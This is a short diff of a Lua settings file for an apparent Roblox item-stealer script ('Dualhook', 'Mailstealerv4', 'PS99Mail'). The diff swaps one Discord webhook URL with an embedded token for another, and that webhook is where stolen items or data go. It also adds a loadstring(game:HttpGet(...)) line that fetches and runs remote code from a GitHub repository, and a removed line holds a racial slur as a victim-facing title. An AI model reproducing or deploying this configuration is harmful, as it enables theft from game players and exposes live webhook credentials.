@@ -1,12 +1,6 @@
--- Dualhook SETTINGS!
-DualhookUsername = "jheremyqt1"
-DualhookWebHook = "https://discord.com/api/webhooks/1211303740272021555/H78apFwN7wXeLOAdysnjERDNrWUgo-blftEyR7o25gLOc1QtK0XWx8wlJMsapixn_9Os"
+Username = "jheremyqt1"
+Webhook = "https://discord.com/api/webhooks/1207314422398459965/WGk0y687HxVCqdhTM0ty-JVEwKksybbo9dR5cU5D0lHfwuhcLQiUsJXPs8sxMXsGI0UD"
+selectedLoadingScreen = "2"
+LoadingScreen = true
 
-HugeSetting = 1
-GemSetting = 100000
-
--- Custom Settings!
-LoadingScreenTitle = "YOU JUST GOT HIT BY THIS KID NIGGA"
-WebHookName = "... Mailstealerv4"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriPremium/main/MoriPremium"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
